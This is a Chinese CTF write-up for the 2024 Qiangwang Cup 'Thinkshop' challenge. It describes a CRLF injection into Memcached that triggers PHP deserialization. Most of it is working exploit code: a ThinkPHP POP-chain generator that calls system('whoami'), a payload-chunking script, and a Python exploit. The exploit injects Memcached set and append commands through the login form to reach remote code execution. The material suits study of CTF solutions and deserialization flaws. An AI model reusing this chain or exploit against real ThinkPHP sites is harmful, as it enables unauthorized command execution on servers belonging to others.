# 2024强网杯-Thinkshop

  
  
&lt;!--more--&gt;  
## 0x01 解题记录  
https://forum.butian.net/share/2859  
`Memcached`存在`CRLF`注入  
当`flags`为`4`时，`Memcached`扩展会自动对数据进行反序列化操作  
所以我们将上述文章，绕过登录的地方直接替换成恶意的序列化数据即可，  
这里有个坑，单次进行`set`不能超过`186 byte`，所以需要利用到`append`进行追增操作  
POP Chains  
```php  
&lt;?php  
namespace think\process\pipes{  
    use think\model\Pivot;  
    ini_set(&#39;display_errors&#39;,1);  
    class Windows{  
        private $files = [];  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;files = [new Pivot($function,$parameter)];  
        }  
    }  
    $a = array(new Windows(&#39;system&#39;,&#39;whoami&#39;));  
    echo strlen(serialize($a)).&#34;\n&#34;;  
    echo urlencode(serialize($a));  
}  
namespace think{  
    abstract class Model  
    {}  
}  
namespace think\model{  
    use think\Model;  
    use think\console\Output;  
    class Pivot extends Model  
    {  
        protected $append = [];  
        protected $error;  
        public $parent;  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;append[&#39;jelly&#39;] = &#39;getError&#39;;  
            $this-&gt;error = new relation\BelongsTo($function,$parameter);  
            $this-&gt;parent = new Output($function,$parameter);  
        }  
    }  
    abstract class Relation  
    {}  
}  
namespace think\model\relation{  
    use think\db\Query;  
    use think\model\Relation;  
    abstract class OneToOne extends Relation  
    {}  
    class BelongsTo extends OneToOne  
    {  
        protected $selfRelation;  
        protected $query;  
        protected $bindAttr = [];  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;selfRelation = false;  
            $this-&gt;query = new Query($function,$parameter);  
            $this-&gt;bindAttr = [&#39;&#39;];  
        }  
    }  
}  
namespace think\db{  
    use think\console\Output;  
    class Query  
    {  
        protected $model;  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;model = new Output($function,$parameter);  
        }  
    }  
}  
namespace think\console{  
    use think\session\driver\Memcache;  
    class Output  
    {  
        protected $styles = [];  
        private $handle;  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;styles = [&#39;getAttr&#39;];  
            $this-&gt;handle = new Memcache($function,$parameter);  
        }  
    }  
}  
namespace think\session\driver{  
    use think\cache\driver\Memcached;  
    class Memcache  
    {  
        protected $handler = null;  
        protected $config  = [  
            &#39;expire&#39;       =&gt; &#39;&#39;,  
            &#39;session_name&#39; =&gt; &#39;&#39;,  
        ];  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;handler = new Memcached($function,$parameter);  
        }  
    }  
}  
namespace think\cache\driver{  
    use think\Request;  
    class Memcached  
    {  
        protected $handler;  
        protected $options = [];  
        protected $tag;  
        public function __construct($function,$parameter)  
        {  
            // pop链中需要prefix存在，否则报错  
            $this-&gt;options = [&#39;prefix&#39;   =&gt; &#39;jelly/&#39;];  
            $this-&gt;tag = true;  
            $this-&gt;handler = new Request($function,$parameter);  
        }  
    }  
}  
namespace think{  
    class Request  
    {  
        protected $get     = [];  
        protected $filter;  
        public function __construct($function,$parameter)  
        {  
            $this-&gt;filter = $function;  
            $this-&gt;get = [&#34;jelly&#34;=&gt;$parameter];  
        }  
    }  
}  
```  
写个分段脚本  
```php  
&lt;?php  
// URL 编码的字符串  
$encoded_str = &#34;a%3A1%3A%7Bi%3A0%3BO%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A30%3A%22think%5Cmodel%5Crelation%5CBelongsTo%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5Ccache%5Cdriver%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A6%3A%22jelly%2F%22%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7Ds%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5Ccache%5Cdriver%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A6%3A%22jelly%2F%22%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D%7D&#34;;  
  
$decoded_str = urldecode($encoded_str); // 解码URL  
echo strlen($decoded_str);  
// 将解码后的字符串按每100个字符分割  
$chunks = str_split($decoded_str, 100);  
  
// 输出为Python可解析的列表  
echo &#34;[&#34;;  
foreach ($chunks as $chunk) {  
    echo &#34;&#39;&#34;.urlencode($chunk).&#34;&#39;,&#34;;  // 转义特殊字符，确保可以在Python中正确解析  
}  
echo &#34;]&#34;;  
?&gt;  
```  
exp.py  
```python  
import requests  
import time  
  
exp_lists = [&#39;a%3A1%3A%7Bi%3A0%3BO%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A&#39;,&#39;17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A30%3A%22thin&#39;,&#39;k%5Cmodel%5Crelation%5CBelongsTo%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A&#39;,&#39;8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22%00think%5Ccon&#39;,&#39;sole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5Ccache%5Cdriv&#39;,&#39;er%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs%3A6%3A%22whoami&#39;,&#39;%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A6%3A%22jelly%2F%22%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B&#39;,&#39;%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7Ds%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0&#39;,&#39;%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22&#39;,&#39;%00think%5Cconsole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5C&#39;,&#39;cache%5Cdriver%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A5%3A%22jelly%22%3Bs&#39;,&#39;%3A6%3A%22whoami%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A6%3A%22jelly%2F%22%3B%7Ds%3A6%3A%22%00%2A&#39;,&#39;%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D%7D&#39;]  
  
method = [&#34;set&#34;, &#34;append&#34;]  # The first method is &#34;set&#34;, others are &#34;append&#34;  
i = 1  
for idx, exp in enumerate(exp_lists):  
    # Set &#34;method&#34; as &#34;set&#34; for the first iteration, and &#34;append&#34; for subsequent ones  
    current_method = method[0] if idx == 0 else method[1]  
      
    # Adjust the &#34;test&#34; value depending on the loop index (100 for all, except last iteration, which is 86)  
    test_value = 100 if idx &lt; len(exp_lists) - 1 else 86  
      
    # Create the URL prefix with the current method and adjusted test value  
    exp_prefix = f&#34;admin%00%0D%0A{current_method}%20think%3Ashop.admin%7Cadmin%204%20500%20{test_value}%0D%0A&#34; &#43; exp  
    print(exp_prefix)  
    data={  
        &#34;username&#34;:exp_prefix,  
        &#34;password&#34;:&#34;123&#34;  
    }  
    data=f&#34;username={exp_prefix}&amp;password=123&#34;  
    headers = {  
        &#34;Content-Type&#34;:&#34;application/x-www-form-urlencoded&#34;  
    }  
    proxies={  
        &#34;http&#34;:&#34;127.0.0.1:8080&#34;  
    }  
    print(f&#34;攻击[{i}]次&#34;)  
    response = requests.post(url=&#34;http://localhost:36000/public/index.php/index/admin/do_login.html&#34;,data=data,proxies=proxies,headers=headers)  
    time.sleep(3)  
    i&#43;=1  
```  
执行成功之后，可以看到完整的数据已经插入  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412061957825.png)
此时返回登录的地方进行触发，即可 RCE  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412061952987.png)
### Reference  
https://mojun.me/2019/05/22/449524479f8320378fe4ed4f701405eb/  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/2024%E5%BC%BA%E7%BD%91%E6%9D%AF-thinkshop/  

